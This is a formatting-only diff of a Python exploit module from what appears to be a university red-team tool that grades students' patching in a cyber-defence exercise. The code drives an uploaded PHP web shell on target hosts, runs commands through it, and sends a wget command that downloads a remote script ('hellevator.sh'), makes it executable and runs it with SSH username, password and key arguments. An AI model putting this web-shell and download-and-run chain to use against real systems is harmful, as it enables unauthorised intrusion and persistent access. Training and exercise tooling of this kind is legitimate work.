@@ -37,21 +37,15 @@ class ChallengeTwoUpload(Exploit):
         )
         server_status_code = server_response.status_code
         if server_status_code == 404:
-            raise PatchedException(
-                f"{self.ip_address} - Server responded with status code `{server_status_code}` which means the user patched this by removing `shell.php`"
-            )
+            raise PatchedException(f"{self.ip_address} - Server responded with status code `{server_status_code}` which means the user patched this by removing `shell.php`")
         server_response_text = server_response.text
-        command_output = (
-            server_response_text.split(f"{command}\n")[1].split("</body>")[0].rstrip()
-        )
+        command_output = server_response_text.split(f"{command}\n")[1].split("</body>")[0].rstrip()
         # logger.debug(f"{self.ip_address} - Command returned `{command_output}`.")
         return command_output
 
     def run_hellevator(self):
         try:
-            logger.info(
-                f"{self.ip_address} - Running Hellevator via ChallengeTwoUpload..."
-            )
+            logger.info(f"{self.ip_address} - Running Hellevator via ChallengeTwoUpload...")
 
             username = self.parsed_config["ssh_username"]
             password = self.parsed_config["ssh_password"]
@@ -60,28 +54,18 @@ class ChallengeTwoUpload(Exploit):
             download_hellevator_command = f"wget -O hellevator.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/hellevator.sh && chmod +x hellevator.sh && ./hellevator.sh -u '{username}' -p '{password}' -s '{ssh_key}'"
             server_response_text = self.run_command(command=download_hellevator_command)
             if ssh_key in server_response_text:
-                logger.info(
-                    f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via ChallengeTwoUpload!{BetterLogger.COLOR_END}"
-                )
+                logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via ChallengeTwoUpload!{BetterLogger.COLOR_END}")
                 return True
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeTwoUpload!{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeTwoUpload!{BetterLogger.COLOR_END}")
             return False
         except requests.ConnectionError:
-            logger.info(
-                f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeTwoUpload because the student disabled the apache2 service!{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeTwoUpload because the student disabled the apache2 service!{BetterLogger.COLOR_END}")
             return None
         except PatchedException:
-            logger.info(
-                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeTwoUpload.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeTwoUpload.{BetterLogger.COLOR_END}")
             return False
         except Exception as err:
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeTwoUpload.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeTwoUpload.{BetterLogger.COLOR_END}")
             logger.exception(err)
             return False
 
@@ -90,34 +74,22 @@ class ChallengeTwoUpload(Exploit):
         Returns True if vulnerable and False if not
         """
         try:
-            logger.info(
-                f"{self.ip_address} - Testing if the target is vulnerable to ChallengeTwoUpload..."
-            )
+            logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeTwoUpload...")
             uploaded_shell_php = self.upload_shell_php()
             if uploaded_shell_php:
-                logger.info(
-                    f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeTwoUpload!{BetterLogger.COLOR_END}"
-                )
+                logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeTwoUpload!{BetterLogger.COLOR_END}")
                 return True
             else:
                 uploaded_normal_image = self.upload_normal_image()
                 if not uploaded_normal_image:
-                    logger.info(
-                        f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeTwoUpload so images cannot be uploaded!{BetterLogger.COLOR_END}"
-                    )
+                    logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeTwoUpload so images cannot be uploaded!{BetterLogger.COLOR_END}")
                     return None
-                logger.info(
-                    f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeTwoUpload.{BetterLogger.COLOR_END}"
-                )
+                logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeTwoUpload.{BetterLogger.COLOR_END}")
                 return False
         except requests.ConnectionError:
-            logger.info(
-                f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeTwoUpload because the student disabled the apache2 service!{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeTwoUpload because the student disabled the apache2 service!{BetterLogger.COLOR_END}")
             return None
         except Exception as err:
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeTwoUpload is vulnerable.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeTwoUpload is vulnerable.{BetterLogger.COLOR_END}")
             logger.exception(err)
             return False
